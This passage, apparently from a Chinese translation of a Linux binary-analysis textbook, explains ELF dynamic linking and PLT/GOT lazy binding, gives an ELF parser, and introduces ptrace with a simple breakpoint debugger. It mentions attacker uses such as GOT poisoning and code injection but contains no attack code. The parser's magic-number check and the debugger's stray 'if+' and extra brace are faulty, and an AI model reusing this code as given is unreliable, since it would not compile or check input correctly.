虽然可重定位代码二进制注入是重定位背后思想的一个很好的例子，但它并不完美地展示了链接器如何在多个目标文件中实际执行。尽管如此，它仍然保留了重定位操作的一般思想和应用。接下来我们将讨论共享库（`ET_DYN`）注入，这将引出动态链接的话题。

# ELF 动态链接

在过去，一切都是静态链接的。如果程序使用外部库函数，整个库将直接编译到可执行文件中。ELF 支持动态链接，这是一种更高效的处理共享库的方式。

当程序加载到内存中时，动态链接器还会将需要的共享库加载到该进程的地址空间并绑定。动态链接的主题很少被人深入理解，因为它是一个相对复杂的过程，在底层似乎像魔术一样工作。在本节中，我们将揭示一些其复杂性并揭示它的工作原理，以及它如何被攻击者滥用。

共享库被编译为位置无关，因此可以很容易地重定位到进程地址空间中。共享库是一个动态 ELF 对象。如果你查看`readelf -h lib.so`，你会看到`e_type`（**ELF 文件类型**）被称为`ET_DYN`。动态对象与可执行文件非常相似。它们通常没有`PT_INTERP`段，因为它们是由程序解释器加载的，因此不会调用程序解释器。

当一个共享库被加载到进程地址空间时，必须满足引用其他共享库的任何重定位。动态链接器必须修改可执行文件的 GOT（全局偏移表）（位于`.got.plt`部分），这是一个位于数据段中的地址表。它位于数据段中，因为它必须是可写的（至少最初是这样；请参阅只读重定位作为安全功能）。动态链接器使用已解析的共享库地址修补 GOT。我们将很快解释**延迟链接**的过程。

## 辅助向量

当一个程序通过`sys_execve()`系统调用加载到内存时，可执行文件被映射并分配一个堆栈（以及其他内容）。该进程地址空间的堆栈被设置为以非常特定的方式传递信息给动态链接器。这种特定的设置和信息排列被称为**辅助向量**或**auxv**。堆栈的底部（因为堆栈在 x86 架构上向下增长，所以它的最高内存地址）加载了以下信息：

![辅助向量](https://github.com/OpenDocCN/freelearn-linux-zh/raw/master/docs/lrn-linux-bin-anls/img/00003.jpeg)

*[argc][argv][envp][auxiliary][.ascii data for argv/envp]*

辅助向量（或 auxv）是一系列 ElfN_auxv_t 结构。

```
typedef struct
{
  uint64_t a_type;              /* Entry type */
  union
    {
      uint64_t a_val;           /* Integer value */
    } a_un;
} Elf64_auxv_t;
```

`a_type`描述了 auxv 条目类型，`a_val`提供了它的值。以下是动态链接器需要的一些最重要的条目类型：

```
#define AT_EXECFD       2       /* File descriptor of program */
#define AT_PHDR         3       /* Program headers for program */
#define AT_PHENT        4       /* Size of program header entry */
#define AT_PHNUM        5       /* Number of program headers */
#define AT_PAGESZ       6       /* System page size */
#define AT_ENTRY        9       /* Entry point of program */
#define AT_UID          11      /* Real uid */
```

动态链接器从堆栈中检索有关正在执行的程序的信息。链接器必须知道程序头的位置，程序的入口点等。我之前列出了一些 auxv 条目类型，取自`/usr/include/elf.h`。

辅助向量是由一个名为`create_elf_tables()`的内核函数设置的，该函数位于 Linux 源代码`/usr/src/linux/fs/binfmt_elf.c`中。

实际上，从内核的执行过程看起来像下面这样：

1.  `sys_execve()` →。

1.  调用`do_execve_common()` →。

1.  调用`search_binary_handler()` →。

1.  调用`load_elf_binary()` →。

1.  调用`create_elf_tables()` →。

以下是`/usr/src/linux/fs/binfmt_elf.c`中`create_elf_tables()`的一些代码，用于添加 auxv 条目：

```
NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE);
NEW_AUX_ENT(AT_PHDR, load_addr + exec->e_phoff);
NEW_AUX_ENT(AT_PHENT, sizeof(struct elf_phdr));
NEW_AUX_ENT(AT_PHNUM, exec->e_phnum);
NEW_AUX_ENT(AT_BASE, interp_load_addr);
NEW_AUX_ENT(AT_ENTRY, exec->e_entry);
```

正如你所看到的，ELF 入口点和程序头的地址等数值是使用内核中的`NEW_AUX_ENT()`宏放置到堆栈上的。

一旦程序加载到内存中并且辅助向量已经填充，控制就会传递给动态链接器。动态链接器解析链接到进程地址空间中的共享库的符号和重定位。默认情况下，可执行文件与 GNU C 库`libc.so`动态链接。`ldd`命令将显示给定可执行文件的共享库依赖关系。

## 了解 PLT/GOT

PLT（过程链接表）和 GOT（全局偏移表）可以在可执行文件和共享库中找到。我们将专门关注可执行程序的 PLT/GOT。当程序调用共享库函数，例如`strcpy()`或`printf()`时，这些函数直到运行时才被解析，必须存在一种机制来动态链接共享库并解析共享函数的地址。当动态链接程序被编译时，它以一种特定的方式处理共享库函数调用，与对本地函数的简单`call`指令完全不同。

让我们来看看 32 位编译的 ELF 可执行文件中 libc.so 函数`fgets()`的调用。我们将在示例中使用 32 位可执行文件，因为与 GOT 的关系更容易可视化，因为不使用 IP 相对寻址，就像在 64 位可执行文件中一样。

```
objdump -d test
 ...
 8048481:       e8 da fe ff ff          call   8048360<fgets@plt>
 ...
```

地址`0x8048360`对应于`fgets()`的 PLT 条目。让我们在可执行文件中查看该地址：

```
objdump -d test (grep for 8048360)
...
08048360<fgets@plt>:                    /* A jmp into the GOT */
 8048360:       ff 25 00 a0 04 08       jmp    *0x804a000
 8048366:       68 00 00 00 00          push   $0x0
 804836b:       e9 e0 ff ff ff          jmp    8048350 <_init+0x34>
...
```

因此，对`fgets()`的调用导致 8048360，这是`fgets()`的 PLT 跳转表条目。正如我们所看到的，在上文反汇编代码输出中，有一个间接跳转到存储在`0x804a000`处的地址。这个地址是 GOT（全局偏移表）条目，其中存储了 libc 共享库中实际`fgets()`函数的地址。

然而，第一次调用函数时，如果使用的是默认行为懒惰链接，那么动态链接器尚未解析其地址。懒惰链接意味着动态链接器不应在程序加载时解析每个函数。相反，它将在调用时解析函数，这是通过`.plt`和`.got.plt`部分（分别对应过程链接表和全局偏移表）实现的。可以通过`LD_BIND_NOW`环境变量将此行为更改为所谓的严格链接，以便所有动态链接都发生在程序加载时。懒惰链接增加了加载时间的性能，这就是为什么它是默认行为，但它也可能是不可预测的，因为链接错误可能要等到程序运行一段时间后才会发生。在多年的经验中，我只遇到过一次这种情况。值得注意的是，一些安全功能，即只读重定位，除非启用了严格链接，否则无法应用，因为`.plt.got`部分（以及其他部分）被标记为只读；这只能在动态链接器完成修补后发生，因此必须使用严格链接。

让我们来看看`fgets()`的重定位条目：

```
$ readelf -r test
Offset   Info      Type           SymValue    SymName
...
0804a000  00000107 R_386_JUMP_SLOT   00000000   fgets
...
```

### 注意

`R_386_JUMP_SLOT`是 PLT/GOT 条目的重定位类型。在`x86_64`上，它被称为`R_X86_64_JUMP_SLOT`。

请注意，重定位偏移量是地址 0x804a000，与`fgets()` PLT 跳转到的相同地址。假设`fgets()`是第一次被调用，动态链接器必须解析`fgets()`的地址，并将其值放入`fgets()`的 GOT 条目中。

让我们来看看我们测试程序中的 GOT：

```
08049ff4 <_GLOBAL_OFFSET_TABLE_>:
 8049ff4:       28 9f 04 08 00 00       sub    %bl,0x804(%edi)
 8049ffa:       00 00                   add    %al,(%eax)
 8049ffc:       00 00                   add    %al,(%eax)
 8049ffe:       00 00                   add    %al,(%eax)
 804a000:       66 83 04 08 76          addw   $0x76,(%eax,%ecx,1)
 804a005:       83 04 08 86             addl   $0xffffff86,(%eax,%ecx,1)
 804a009:       83 04 08 96             addl   $0xffffff96,(%eax,%ecx,1)
 804a00d:       83                      .byte 0x83
 804a00e:       04 08                   add    $0x8,%al
```

地址`0x08048366`在上文中被突出显示，并且在 GOT 中的`0x804a000`处找到。请记住，小端序颠倒了字节顺序，因此它显示为`66 83 04 08`。这个地址不是`fgets()`函数的地址，因为它尚未被链接器解析，而是指向`fgets()`的 PLT 条目。让我们再次看一下`fgets()`的 PLT 条目：

```
08048360 <fgets@plt>:
 8048360:       ff 25 00 a0 04 08       jmp    *0x804a000
 8048366:       68 00 00 00 00          push   $0x0
 804836b:       e9 e0 ff ff ff          jmp    8048350 <_init+0x34>
```

因此，`jmp *0x804a000` 跳转到`0x8048366`中包含的地址，这是`push $0x0`指令。该 push 指令有一个目的，即将`fgets()`的 GOT 条目推送到堆栈上。`fgets()`的 GOT 条目偏移为 0x0，对应于保留给共享库符号值的第一个 GOT 条目，实际上是第四个 GOT 条目，即 GOT[3]。换句话说，共享库地址不是从 GOT[0]开始插入的，而是从 GOT[3]开始（第四个条目），因为前三个条目是为其他目的保留的。

### 注意

请注意以下 GOT 偏移：

+   GOT[0]包含一个地址，指向可执行文件的动态段，动态链接器用于提取与动态链接相关的信息

+   GOT[1]包含了动态链接器用于解析符号的`link_map`结构的地址。

+   GOT[2]包含动态链接器`_dl_runtime_resolve()`函数的地址，用于解析共享库函数的实际符号地址。

`fgets()` PLT 存根中的最后一条指令是 jmp 8048350。该地址指向每个可执行文件中的第一个 PLT 条目，称为 PLT-0。

**PLT-0** 中包含我们可执行文件的以下代码：

```
 8048350:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 8048356:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
 804835c:       00 00                   add    %al,(%eax)
```

第一个`pushl`指令将第二个 GOT 条目 GOT[1]的地址推送到堆栈上，正如前面所述，其中包含`link_map`结构的地址。

`jmp *0x8049ffc` 执行对第三个 GOT 条目 GOT[2]的间接跳转，其中包含动态链接器`_dl_runtime_resolve()`函数的地址，因此将控制权转移到动态链接器并解析`fgets()`的地址。一旦`fgets()`被解析，对`forfgets()`的所有未来调用都将导致跳转到`fgets()`代码本身，而不是指向 PLT 并再次进行延迟链接过程。

以下是我们刚刚讨论的内容的总结：

1.  调用`fgets@PLT`（调用`fgets`函数）。

1.  PLT 代码执行对 GOT 中地址的间接`jmp`。

1.  GOT 条目包含指向 PLT 中`push`指令的地址。

1.  `push $0x0`指令将`fgets()`的 GOT 条目的偏移推送到堆栈上。

1.  最终的`fgets()` PLT 指令是跳转到 PLT-0 代码。

1.  PLT-0 的第一条指令将 GOT[1]的地址推送到堆栈上，其中包含`fgets()`的`link_map`结构的偏移。

1.  PLT-0 的第二条指令是跳转到 GOT[2]中的地址，该地址指向动态链接器的`_dl_runtime_resolve()`，然后通过将`fgets()`的符号值（内存地址）添加到`.got.plt`部分中相应的 GOT 条目来处理`R_386_JUMP_SLOT`重定位。

下一次调用`fgets()`时，PLT 条目将直接跳转到函数本身，而不必再执行重定位过程。

## 重新访问动态段

我之前提到动态段被命名为`.dynamic`。动态段有一个引用它的段头，但它也有一个引用它的程序头，因为动态链接器必须在运行时找到它；由于段头不会被加载到内存中，因此必须有一个相关的程序头。

动态段包含了类型为`ElfN_Dyn`的结构数组：

```
typedef struct {
    Elf32_Sword    d_tag;
    union {
      Elf32_Word d_val;
      Elf32_Addr d_ptr;
    } d_un;
} Elf32_Dyn;
```

`d_tag`字段包含一个标签，与 ELF(5)手册中可以找到的众多定义之一匹配。我列出了动态链接器使用的一些最重要的定义。

### DT_NEEDED

这包含了所需共享库的名称的字符串表偏移。

### DT_SYMTAB

这包含了动态符号表的地址，也被称为`.dynsym`部分。

### DT_HASH

这包含了符号哈希表的地址，也被称为`.hash`部分（有时也被命名为`.gnu.hash`）。

### DT_STRTAB

这包含了符号字符串表的地址，也被称为`.dynstr`部分。

### DT_PLTGOT

这保存了全局偏移表的地址。

### 注意

前面的动态标签演示了如何通过动态段找到某些部分的位置，这些部分可以帮助在取证重建任务中重建段头表。如果段头表已被剥离，一个聪明的人可以通过从动态段（即.dynstr、.dynsym 和.hash 等）获取信息来重建部分内容。

其他段，如文本和数据，也可以提供所需的信息（例如`.text`和`.data`部分）。

`ElfN_Dyn`的`d_val`成员保存一个整数值，有各种解释，比如作为重定位条目的大小。

`d_ptr`成员保存一个虚拟内存地址，可以指向链接器需要的各种位置；一个很好的例子是`d_tag` `DT_SYMTAB`的符号表地址。

动态链接器利用`ElfN_Dyn`的`d_tags`来定位动态段的不同部分，这些部分通过`d_tag`（例如`DT_SYMTAB`）指向可执行文件的某个部分，其中`d_ptr`给出了符号表的虚拟地址。

当动态链接器映射到内存中时，如果有必要，它首先处理自己的任何重定位；请记住，链接器本身也是一个共享库。然后，它查看可执行程序的动态段，并搜索包含指向所需共享库的字符串或路径名的`DT_NEEDED`标签。当它将所需的共享库映射到内存时，它访问库的动态段（是的，它们也有动态段），并将库的符号表添加到存在的用于保存每个映射库的符号表的链中。

链接器为每个共享库创建一个`link_map`结构条目，并将其存储在一个链表中：

```
struct link_map
  {
    ElfW(Addr) l_addr; /* Base address shared object is loaded at.  */
    char *l_name;      /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;   /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
```

一旦链接器完成了构建其依赖项列表，它会处理每个库的重定位，类似于本章前面讨论的重定位，以及修复每个共享库的 GOT。**懒惰链接**仍然适用于共享库的 PLT/GOT，因此 GOT 重定位（类型为`R_386_JMP_SLOT`）直到实际调用函数时才会发生。

有关 ELF 和动态链接的更详细信息，请阅读在线的 ELF 规范，或查看一些有趣的 glibc 源代码。希望到这一点，动态链接已经不再是一个神秘，而是一个引人入胜的东西。在第七章*进程内存取证*中，我们将介绍 PLT/GOT 中毒技术，以重定向共享库函数调用。一个非常有趣的技术是颠覆动态链接。

# 编写 ELF 解析器

为了帮助总结我们所学到的一些知识，我包含了一些简单的代码，将打印出一个 32 位 ELF 可执行文件的程序头和段名称。本书中将展示更多与 ELF 相关的代码示例（以及更有趣的示例）：

```
/* elfparse.c – gcc elfparse.c -o elfparse */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <elf.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char **argv)
{
   int fd, i;
   uint8_t *mem;
   struct stat st;
   char *StringTable, *interp;

   Elf32_Ehdr *ehdr;
   Elf32_Phdr *phdr;
   Elf32_Shdr *shdr;

   if (argc < 2) {
      printf("Usage: %s <executable>\n", argv[0]);
      exit(0);
   }

   if ((fd = open(argv[1], O_RDONLY)) < 0) {
      perror("open");
      exit(-1);
   }

   if (fstat(fd, &st) < 0) {
      perror("fstat");
      exit(-1);
   }

   /* Map the executable into memory */
   mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
   if (mem == MAP_FAILED) {
      perror("mmap");
      exit(-1);
   }

   /*
    * The initial ELF Header starts at offset 0
    * of our mapped memory.
    */
   ehdr = (Elf32_Ehdr *)mem;

   /*
    * The shdr table and phdr table offsets are
    * given by e_shoff and e_phoff members of the
    * Elf32_Ehdr.
    */
   phdr = (Elf32_Phdr *)&mem[ehdr->e_phoff];
   shdr = (Elf32_Shdr *)&mem[ehdr->e_shoff];

   /*
    * Check to see if the ELF magic (The first 4 bytes)
    * match up as 0x7f E L F
    */
   if (mem[0] != 0x7f && strcmp(&mem[1], "ELF")) {
      fprintf(stderr, "%s is not an ELF file\n", argv[1]);
      exit(-1);
   }

   /* We are only parsing executables with this code.
    * so ET_EXEC marks an executable.
    */
   if (ehdr->e_type != ET_EXEC) {
      fprintf(stderr, "%s is not an executable\n", argv[1]);
      exit(-1);
   }

   printf("Program Entry point: 0x%x\n", ehdr->e_entry);

   /*
    * We find the string table for the section header
    * names with e_shstrndx which gives the index of
    * which section holds the string table.
    */
   StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];

   /*
    * Print each section header name and address.
    * Notice we get the index into the string table
    * that contains each section header name with
    * the shdr.sh_name member.
    */
   printf("Section header list:\n\n");
   for (i = 1; i < ehdr->e_shnum; i++)
      printf("%s: 0x%x\n", &StringTable[shdr[i].sh_name], shdr[i].sh_addr);

   /*
    * Print out each segment name, and address.
    * Except for PT_INTERP we print the path to
    * the dynamic linker (Interpreter).
    */
   printf("\nProgram header list\n\n");
   for (i = 0; i < ehdr->e_phnum; i++) {   
      switch(phdr[i].p_type) {
         case PT_LOAD:
            /*
             * We know that text segment starts
             * at offset 0\. And only one other
             * possible loadable segment exists
             * which is the data segment.
             */
            if (phdr[i].p_offset == 0)
               printf("Text segment: 0x%x\n", phdr[i].p_vaddr);
            else
               printf("Data segment: 0x%x\n", phdr[i].p_vaddr);
         break;
         case PT_INTERP:
            interp = strdup((char *)&mem[phdr[i].p_offset]);
            printf("Interpreter: %s\n", interp);
            break;
         case PT_NOTE:
            printf("Note segment: 0x%x\n", phdr[i].p_vaddr);
            break;
         case PT_DYNAMIC:
            printf("Dynamic segment: 0x%x\n", phdr[i].p_vaddr);
            break;
         case PT_PHDR:
            printf("Phdr segment: 0x%x\n", phdr[i].p_vaddr);
            break;
      }
   }

   exit(0);
}
```

### 提示

**下载示例代码**

您可以从[`www.packtpub.com`](http://www.packtpub.com)的帐户中下载您购买的所有 Packt Publishing 图书的示例代码文件。如果您在其他地方购买了本书，您可以访问[`www.packtpub.com/support`](http://www.packtpub.com/support)并注册，文件将直接通过电子邮件发送给您。

# 总结

现在我们已经探索了 ELF，我敦促读者继续探索这种格式。在本书中，您将遇到许多项目，希望能激发您的兴趣。学习这些知识需要多年的热情和探索，我很感激能够分享我所学到的知识，并以一种有趣和创造性的方式呈现给读者，帮助他们学习这些困难的材料。


# 第三章：Linux 进程跟踪

在上一章中，我们介绍了`ELF`格式的内部结构并解释了它的内部工作原理。在使用`ELF`的 Linux 和其他 Unix 风格的操作系统中，`ptrace`系统调用与分析、调试、逆向工程和修改使用`ELF`格式的程序密切相关。`ptrace`系统调用用于连接到进程并访问整个代码、数据、堆栈、堆和寄存器范围。

由于`ELF`程序完全映射在进程地址空间中，您可以连接到进程并类似于在磁盘上对实际`ELF`文件进行操作一样解析或修改`ELF`镜像。主要区别在于我们使用`ptrace`来访问程序，而不是使用`open/mmap/read/write`调用来访问`ELF`文件。

使用`ptrace`，我们可以完全控制程序的执行流程，这意味着我们可以做一些非常有趣的事情，从内存病毒感染和病毒分析/检测到用户态内存 rootkit、高级调试任务、热修补和逆向工程。由于本书中有专门章节涵盖了其中一些任务，我们暂时不会深入讨论每一个。相反，我将为您提供一个入门，让您了解`ptrace`的一些基本功能以及黑客如何使用它。

# ptrace 的重要性

在 Linux 中，`ptrace(2)`系统调用是用户空间访问进程地址空间的手段。这意味着某人可以连接到他们拥有的进程并修改、分析、逆向和调试它。著名的调试和分析应用程序，如`gdb`、`strace`和`ltrace`都是`ptrace`辅助应用程序。`ptrace`命令对于逆向工程师和恶意软件作者都非常有用。

它给程序员提供了连接到进程并修改内存的能力，这可以包括注入代码和修改重要的数据结构，比如用于共享库重定向的**全局偏移表**（**GOT**）。在本节中，我们将介绍`ptrace`最常用的功能，演示来自攻击者方的内存感染，以及通过编写一个程序来将进程镜像重构回可执行文件进行进程分析。如果您从未使用过`ptrace`，那么您会发现您错过了很多乐趣！

# ptrace 请求

`ptrace`系统调用有一个`libc`包装器，就像任何其他系统调用一样，所以你可以包含`ptrace.h`并简单地调用`ptrace`，同时传递一个请求和一个进程 ID。以下细节并不取代`ptrace(2)`的主要页面，尽管一些描述是从主要页面借来的。

这就是概要。

```
#include <sys/ptrace.h>
long ptrace(enum __ptrace_request request, pid_t pid,
void *addr, void *data);
```

## ptrace 请求类型

以下是在使用`ptrace`与进程镜像交互时最常用的请求列表：

| 请求 | 描述 |
| --- | --- |
| `PTRACE_ATTACH` | 连接到指定`pid`的进程，使其成为调用进程的被跟踪者。被跟踪者会收到一个`SIGSTOP`信号，但不一定在此调用完成时已经停止。使用`waitpid(2)`等待被跟踪者停止。 |
| `PTRACE_TRACEME` | 表示此进程将由其父进程进行跟踪。如果父进程不希望跟踪它，那么进程可能不应该发出此请求。 |
| `PTRACE_PEEKTEXT PTRACE_PEEKDATA PTRACE_PEEKUSER` | 这些请求允许跟踪进程从被跟踪进程镜像中的虚拟内存地址读取；例如，我们可以将整个文本或数据段读入缓冲区进行分析。请注意，在`PEEKTEXT`、`PEEKDATA`和`PEEKUSER`请求之间的实现没有区别。 |
| `PTRACE_POKTEXT PTRACE_POKEDATA PTRACE_POKEUSER` | 这些请求允许跟踪进程修改被跟踪进程镜像中的任何位置。 |
| `PTRACE_GETREGS` | 此请求允许跟踪进程获取被跟踪进程的寄存器副本。当然，每个线程上下文都有自己的寄存器集。 |
| `PTRACE_SETREGS` | 此请求允许跟踪进程为被跟踪的进程设置新的寄存器值，例如，修改指令指针的值指向 shellcode。 |
| `PTRACE_CONT` | 此请求告诉停止的被跟踪进程恢复执行。 |
| `PTRACE_DETACH` | 此请求恢复被跟踪的进程，但也会分离。 |
| `PTRACE_SYSCALL` | 此请求恢复被跟踪的进程，但安排它在下一个系统调用的入口/退出处停止。这允许我们检查系统调用的参数，甚至修改它们。这个`ptrace`请求在一个名为`strace`的程序的代码中被大量使用，它随大多数 Linux 发行版一起提供。 |
| `PTRACE_SINGLESTEP` | 这会恢复进程，但在下一条指令后停止它。单步执行允许调试器在执行每条指令后停止。这允许用户在每条指令后检查寄存器的值和进程的状态。 |
| `PTRACE_GETSIGINFO` | 这会检索导致停止的信号的信息。它检索`siginfo_t`结构的副本，我们可以分析或修改它（使用`PTRACE_SETSIGINFO`）发送回 tracee。 |
| `PTRACE_SETSIGINFO` | 设置信号信息。从跟踪器中的地址数据复制一个`siginfo_t`结构到 tracee。这只会影响通常会传递给 tracee 并且会被 tracer 捕获的信号。很难区分这些正常信号和`ptrace()`本身生成的合成信号（`addr`被忽略）。 |
| `PTRACE_SETOPTIONS` | 从数据中设置`ptrace`选项（`addr`被忽略）。数据被解释为选项的位掩码。这些选项由以下部分的标志指定（查看`ptrace(2)`的主页面进行列出）。 |

术语*tracer*指的是正在进行跟踪的进程（调用`ptrace`的进程），而术语*tracee*或*the traced*指的是被 tracer 跟踪的程序（使用`ptrace`）。

### 注意

默认行为会覆盖任何 mmap 或 mprotect 权限。这意味着用户可以使用`ptrace`写入文本段（即使它是只读的）。如果内核是 pax 或 grsec 并且使用 mprotect 限制进行了修补，这就不成立了，它会强制执行段权限，以便它们也适用于`ptrace`；这是一个安全功能。

我在[`vxheavens.com/lib/vrn00.html`](http://vxheavens.com/lib/vrn00.html)上的关于*ELF 运行时感染*的论文讨论了一些绕过这些限制进行代码注入的方法。

# 进程寄存器状态和标志

`x86_64`的`user_regs_struct`结构包含通用寄存器、分段寄存器、堆栈指针、指令指针、CPU 标志和 TLS 寄存器：

```
<sys/user.h>
struct user_regs_struct
{
  __extension__ unsigned long long int r15;
  __extension__ unsigned long long int r14;
  __extension__ unsigned long long int r13;
  __extension__ unsigned long long int r12;
  __extension__ unsigned long long int rbp;
  __extension__ unsigned long long int rbx;
  __extension__ unsigned long long int r11;
  __extension__ unsigned long long int r10;
  __extension__ unsigned long long int r9;
  __extension__ unsigned long long int r8;
  __extension__ unsigned long long int rax;
  __extension__ unsigned long long int rcx;
  __extension__ unsigned long long int rdx;
  __extension__ unsigned long long int rsi;
  __extension__ unsigned long long int rdi;
  __extension__ unsigned long long int orig_rax;
  __extension__ unsigned long long int rip;
  __extension__ unsigned long long int cs;
  __extension__ unsigned long long int eflags;
  __extension__ unsigned long long int rsp;
  __extension__ unsigned long long int ss;
  __extension__ unsigned long long int fs_base;
  __extension__ unsigned long long int gs_base;
  __extension__ unsigned long long int ds;
  __extension__ unsigned long long int es;
  __extension__ unsigned long long int fs;
  __extension__ unsigned long long int gs;
};
```

在 32 位 Linux 内核中，`%gs`被用作**线程本地存储**（**TLS**）指针，尽管自`x86_64`以来，`%fs`寄存器已被用于此目的。使用`user_regs_struct`中的寄存器，并使用`ptrace`对进程的内存进行读/写访问，我们可以完全控制它。作为练习，让我们编写一个简单的调试器，允许我们在程序中的某个函数处设置断点。当程序运行时，它将在断点处停止并打印寄存器值和函数参数。

# 一个简单的基于 ptrace 的调试器

让我们看一个使用`ptrace`创建调试器程序的代码示例：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

typedef struct handle {
  Elf64_Ehdr *ehdr;
  Elf64_Phdr *phdr;
  Elf64_Shdr *shdr;
  uint8_t *mem;
  char *symname;
  Elf64_Addr symaddr;
  struct user_regs_struct pt_reg;
  char *exec;
} handle_t;

Elf64_Addr lookup_symbol(handle_t *, const char *);

int main(int argc, char **argv, char **envp)
{
  int fd;
  handle_t h;
  struct stat st;
  long trap, orig;
  int status, pid;
  char * args[2];
  if (argc < 3) {
    printf("Usage: %s <program> <function>\n", argv[0]);
    exit(0);
  }
  if ((h.exec = strdup(argv[1])) == NULL) {
    perror("strdup");
    exit(-1);
  }
  args[0] = h.exec;
  args[1] = NULL;
  if ((h.symname = strdup(argv[2])) == NULL) {
    perror("strdup");
    exit(-1);
  }
  if ((fd = open(argv[1], O_RDONLY)) < 0) {
    perror("open");
    exit(-1);
  }
  if (fstat(fd, &st) < 0) {
    perror("fstat");
    exit(-1);
  }
  h.mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
  if (h.mem == MAP_FAILED) {
    perror("mmap");
    exit(-1);
  }
  h.ehdr = (Elf64_Ehdr *)h.mem;
  h.phdr = (Elf64_Phdr *)(h.mem + h.ehdr->e_phoff);
  h.shdr = (Elf64_Shdr *)(h.mem + h.ehdr->e_shoff);
  if+ (h.mem[0] != 0x7f || strcmp((char *)&h.mem[1], "ELF")) {
    printf("%s is not an ELF file\n",h.exec);
    exit(-1);
  }
  if (h.ehdr->e_type != ET_EXEC) {
    printf("%s is not an ELF executable\n", h.exec);
    exit(-1);
  }
  if (h.ehdr->e_shstrndx == 0 || h.ehdr->e_shoff == 0 || h.ehdr->e_shnum == 0) {
    printf("Section header table not found\n");
    exit(-1);
  }
  if ((h.symaddr = lookup_symbol(&h, h.symname)) == 0) {
    printf("Unable to find symbol: %s not found in executable\n", h.symname);
    exit(-1);
  }
  close(fd);
  if ((pid = fork()) < 0) {
    perror("fork");
    exit(-1);
  }
  if (pid == 0) {
    if (ptrace(PTRACE_TRACEME, pid, NULL, NULL) < 0) {
      perror("PTRACE_TRACEME");
      exit(-1);
    }
    execve(h.exec, args, envp);
    exit(0);
  }
  wait(&status);
  printf("Beginning analysis of pid: %d at %lx\n", pid, h.symaddr);
  if ((orig = ptrace(PTRACE_PEEKTEXT, pid, h.symaddr, NULL)) < 0) {
    perror("PTRACE_PEEKTEXT");
    exit(-1);
  }
  trap = (orig & ~0xff) | 0xcc;
  if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {
    perror("PTRACE_POKETEXT");
    exit(-1);
  }
  trace:
  if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
    perror("PTRACE_CONT");
    exit(-1);
  }
  wait(&status);
  if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
    if (ptrace(PTRACE_GETREGS, pid, NULL, &h.pt_reg) < 0) {
      perror("PTRACE_GETREGS");
      exit(-1);
    }
    printf("\nExecutable %s (pid: %d) has hit breakpoint 0x%lx\n",
    h.exec, pid, h.symaddr);
    printf("%%rcx: %llx\n%%rdx: %llx\n%%rbx: %llx\n"
    "%%rax: %llx\n%%rdi: %llx\n%%rsi: %llx\n"
    "%%r8: %llx\n%%r9: %llx\n%%r10: %llx\n"
    "%%r11: %llx\n%%r12 %llx\n%%r13 %llx\n"
    "%%r14: %llx\n%%r15: %llx\n%%rsp: %llx",
    h.pt_reg.rcx, h.pt_reg.rdx, h.pt_reg.rbx,
    h.pt_reg.rax, h.pt_reg.rdi, h.pt_reg.rsi,
    h.pt_reg.r8, h.pt_reg.r9, h.pt_reg.r10,
    h.pt_reg.r11, h.pt_reg.r12, h.pt_reg.r13,
    h.pt_reg.r14, h.pt_reg.r15, h.pt_reg.rsp);
    printf("\nPlease hit any key to continue: ");
    getchar();
    if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, orig) < 0) {
      perror("PTRACE_POKETEXT");
      exit(-1);
    }
    h.pt_reg.rip = h.pt_reg.rip - 1;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &h.pt_reg) < 0) {
      perror("PTRACE_SETREGS");
      exit(-1);
    }
    if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0) {
      perror("PTRACE_SINGLESTEP");
      exit(-1);
    }
    wait(NULL);
    if (ptrace(PTRACE_POKETEXT, pid, h.symaddr, trap) < 0) {
      perror("PTRACE_POKETEXT");
      exit(-1);
    }
    goto trace;
    }
    if (WIFEXITED(status))
    printf("Completed tracing pid: %d\n", pid);
    exit(0);
  }

  Elf64_Addr lookup_symbol(handle_t *h, const char *symname)
  {
    int i, j;
    char *strtab;
    Elf64_Sym *symtab;
    for (i = 0; i < h->ehdr->e_shnum; i++) {
      if (h->shdr[i].sh_type == SHT_SYMTAB) {
        strtab = (char *)&h->mem[h->shdr[h->shdr[i].sh_link].sh_offset];
        symtab = (Elf64_Sym *)&h->mem[h->shdr[i].sh_offset];
        for (j = 0; j < h->shdr[i].sh_size/sizeof(Elf64_Sym); j++) {
          if(strcmp(&strtab[symtab->st_name], symname) == 0)
          return (symtab->st_value);
          symtab++;
        }
      }
    }
  return 0;
  }
}
```

## 使用跟踪程序

要编译前面的源代码，请使用以下命令：

```
gcc tracer.c –o tracer

```

请记住，`tracer.c`通过查找和引用`SHT_SYMTAB`类型的段头来定位符号表，因此它不适用于已经剥离了`SHT_SYMTAB`符号表的可执行文件（尽管它们可能有`SHT_DYNSYM`）。这其实是有道理的，因为通常我们调试的程序仍处于开发阶段，所以它们通常有一个完整的符号表。

另一个限制是它不允许你向正在执行和跟踪的程序传递参数。因此，在真正的调试情况下，你可能需要向正在调试的程序传递开关或命令行选项，这样它就不会表现得很好。

作为我们设计的`./tracer`程序的一个例子，让我们尝试在一个非常简单的程序上使用它，这个程序调用一个名为`print_string(char *)`的函数两次，并在第一轮传递`Hello 1`字符串，在第二轮传递`Hello 2`。

这是使用`./tracer`代码的一个例子：

```
$ ./tracer ./test print_string
Beginning analysis of pid: 6297 at 40057d
Executable ./test (pid: 6297) has hit breakpoint 0x40057d
%rcx: 0
